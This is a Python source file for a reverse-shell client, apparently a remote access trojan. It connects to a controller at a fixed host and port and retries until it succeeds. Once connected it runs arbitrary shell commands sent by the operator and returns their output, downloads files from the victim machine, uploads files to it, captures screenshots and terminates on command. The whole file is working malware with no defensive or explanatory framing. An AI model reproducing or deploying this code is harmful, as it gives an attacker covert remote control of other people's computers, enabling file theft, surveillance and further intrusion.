from socket import socket , AF_INET , SOCK_STREAM
from subprocess import Popen, PIPE
from PIL import ImageGrab
import os



host = '127.0.0.1'
port = 4444
cmds = {'--d':1,'--ts':2,'--up':3,'--kill':4}

def buffer(s):
	r = 0
	size = 8
	l = int(s.recv(size))
	s.send(' ')
	data = ''
	while r<l:
		offset = s.recv(size)
		r+=size
		data += offset

	s.send(' ')
	return data

def handle_fname(name,seperator):
	name = name.split(seperator)[-1]
	return name

def rw(name,method):
	if method is 'r':
		op = open(name,'rb')
		content = op.read()
		op.close()
		if not content:
			sender('0',s)
			sender('file is empty',s)
		else:
			print content
			sender(content,s)
			sender('file %s has been downloaded'%name,s)
	elif method is 'w':
		content = buffer(s)
		if '\\' in name:
			seperator = '\\'
			name = handle_fname(name,seperator)
		elif '/' in name:
			seperator = '/'
			name = handle_fname(name,seperator)

		op = open(name,'wb')
		op.write(content)
		op.close()
		sender('file %s has been uploaded'%name,s)

def screen():
	snapshot = ImageGrab.grab()
	snapshot.save('x.jpg')
	op = open('x.jpg','rb')
	content = op.read()
	op.close()
	os.remove('x.jpg')
	sender(content,s)
	sender('screenshot has been taken',s)
	

def sender(data,s):
	s.send(str(len(data)))
	s.recv(1)
	s.send(data)
	s.recv(1)


def main():
	global s
	while True:
		try:
			
			while True:
				try:
					s = socket(AF_INET,SOCK_STREAM)
					os.system('cls')
					print 'Listening Mode'
					s.connect((host,port))
					os.system('cls')
					print 'Connected'

					while True:
						res = int(buffer(s))
						if res == 1:
							continue
						elif res == 2:
							sender('press \'help\' to display available options',s)
							break
					break

				except:
					pass
					

			while True:
				cmd = buffer(s)
				if cmd is ' ':
					continue
				elif cmd.startswith('--'):
					order = cmd.split(' ')[0]
					id = cmds[order]
					clean_cmd = cmd.replace(order+' ','')
					if id is 1:
						rw(clean_cmd,'r')
					elif id is 2:
						screen()
					elif id is 3:
						rw(clean_cmd,'w')
					elif id is 4:
						sender('payload was killed',s)
						exit()
					
				else:
					proc = Popen([cmd],stdout=PIPE,shell=True)
					data_sender = proc.communicate()[0]
					if data_sender == '':
						sender(' ',s)
					else:
						sender(data_sender,s)

			s.close()
		except:
			continue


main()
